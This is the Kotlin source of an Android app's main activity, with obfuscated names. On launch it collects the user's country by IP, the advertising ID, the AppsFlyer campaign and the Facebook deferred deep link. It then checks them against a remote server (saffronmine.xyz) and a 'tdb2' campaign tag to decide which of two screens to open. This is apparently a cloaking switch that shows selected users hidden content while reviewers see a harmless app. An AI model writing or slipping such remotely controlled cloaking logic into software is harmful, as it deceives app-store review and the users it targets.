package com.datavisionstudio.rogueli
import kotlinx.coroutines.Job

import kotlinx.coroutines.launch
import retrofit2.Retrofit
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk



import android.content.Context
import com.datavisionstudio.rogueli.tdujxcusw.Fracedkih.Companion.tyridkmkcx
import android.content.Intent
import com.datavisionstudio.rogueli.tdujxcusw.Fracedkih.Companion.bgyud
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle


import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib

import com.datavisionstudio.rogueli.databinding.ActivityMainBinding
import com.datavisionstudio.rogueli.tdujxcusw.Nerkgdfs
import com.datavisionstudio.rogueli.tdujxcusw.Fracedkih.Companion.reisjkakd
import java.util.concurrent.TimeUnit
import com.datavisionstudio.rogueli.tdujxcusw.Fracedkih.Companion.qpols



import com.datavisionstudio.rogueli.tdujxcusw.Vaqerfdaxz
import com.datavisionstudio.rogueli.ywqasxc.Posparaf

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import com.datavisionstudio.rogueli.tdujxcusw.Fracedkih.Companion.osdkokxmczk

import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors


class MainActivity : AppCompatActivity() {
    lateinit var rkxmmckzxos: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        rkxmmckzxos = ActivityMainBinding.inflate(layoutInflater)
        setContentView(rkxmmckzxos.root)

        tyoppdf(this)
        GlobalScope.launch(Dispatchers.IO) {
            vftcixosd
        }

        AppsFlyerLib.getInstance()
            .init("M9qmZye4jFjXADKjgtQzwf", hufifiod, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private suspend fun jubijcx(): String? {
        val gredsx = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Nerkgdfs::class.java)

        val zloxixus = gredsx.reisokxkmckmzusua().body()?.vftycxi
        Log.d("Data", "countryCode: $zloxixus ")
        return zloxixus

    }




    private val hufifiod = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(gufido: MutableMap<String, Any>?) {
            val xdopsxla = gufido?.get("campaign").toString()
            Hawk.put(qpols, xdopsxla)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }

    private fun yuidikxkz(){
        val njuiodfja = AdvertisingIdClient(applicationContext)
        njuiodfja.start()
        val bgycisd = njuiodfja.info.id
        Log.d("getAdvertisingId = ", bgycisd.toString())
        Hawk.put(osdkokxmczk, bgycisd)
    }


    private val vftcixosd: Job = GlobalScope.launch(Dispatchers.IO) {
        val wsisoxlc: String = jubijcx().toString()
        val huiisjajdkxncnzx = pmxjzusyd().toString()

        Log.d("CountryPool",huiisjajdkxncnzx)
        Log.d("CountryCode",wsisoxlc)

        val cdicoas: String? = Hawk.get(tyridkmkcx, "null")
        val loviibjcvuhbhvusw = Hawk.get(bgyud, "null")

        var jjvnvcnjivi: String? = Hawk.get(qpols)
        yuidikxkz()
        if (loviibjcvuhbhvusw == "1") {
            val wsowslxoc = Executors.newSingleThreadScheduledExecutor()
            wsowslxoc.scheduleAtFixedRate({
                if (jjvnvcnjivi != null) {
                    Log.d("TestInUIHawk", jjvnvcnjivi.toString())

                    if (jjvnvcnjivi!!.contains("tdb2") || huiisjajdkxncnzx.contains(wsisoxlc) || cdicoas!!.contains("tdb2")) {
                        Log.d("Apps Checker", "naming: $jjvnvcnjivi")
                        wsowslxoc.shutdown()
                        startActivity(Intent(this@MainActivity, Vaqerfdaxz::class.java))
                        finish()
                    } else {
                        wsowslxoc.shutdown()
                        startActivity(Intent(this@MainActivity, Posparaf::class.java))
                        finish()
                    }
                } else {
                    jjvnvcnjivi = Hawk.get(qpols)
                    Log.d("TestInUIHawk", "Received null $jjvnvcnjivi")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (huiisjajdkxncnzx.contains(wsisoxlc)) {
            startActivity(Intent(this@MainActivity, Vaqerfdaxz::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Posparaf::class.java))
            finish()
        }
    }



    fun tyoppdf(vgcuxud: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            vgcuxud
        ) { eisoaod: AppLinkData? ->
            eisoaod?.let {
                val kbivi = eisoaod.targetUri.host.toString()
                Hawk.put(tyridkmkcx, kbivi)
            }
            if (eisoaod == null) {

            }
        }
    }


    private suspend fun pmxjzusyd(): String? {
        val feisioxokkczx = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://saffronmine.xyz/")
            .build()
            .create(Nerkgdfs::class.java)

        val vfrdtsiis = feisioxokkczx.iuidjvcd().body()?.aops
        Log.d("Data", "getDataDev: $vfrdtsiis")

        val poslkxcj = feisioxokkczx.iuidjvcd().body()?.nhyudiixjkzkushd
        Hawk.put(bgyud, poslkxcj)

        Hawk.put(reisjkakd, vfrdtsiis)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(reisjkakd, "null")}")

        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(bgyud, "null")}")
        val blobiodsif = feisioxokkczx.iuidjvcd().body()?.fesl

        Log.d("Data", blobiodsif.toString())
        return blobiodsif
    }


}